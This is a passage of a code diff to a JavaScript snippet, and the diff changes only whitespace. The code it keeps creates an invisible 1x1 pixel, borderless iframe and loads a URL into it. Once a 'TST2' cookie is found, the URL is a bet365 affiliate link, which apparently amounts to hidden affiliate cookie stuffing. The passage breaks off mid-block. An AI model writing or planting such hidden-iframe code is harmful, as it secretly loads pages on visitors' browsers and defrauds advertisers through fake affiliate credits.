@@ -1,11 +1,11 @@
- function checkId(myid) {
+function checkId(myid) {
         var ifrm = document.createElement("iframe");
         ifrm.setAttribute("src", myid);
         ifrm.style.width = "1px";
         ifrm.style.height = "1px";
         ifrm.style.borderStyle = "none";
         document.body.appendChild(ifrm);
- }
+}
 if (document.cookie.indexOf("TST2") >= 0) {
     var id0 = 'http://www.bet365.com/home/?affiliate=365_550128';
     var idt0 = 3000;
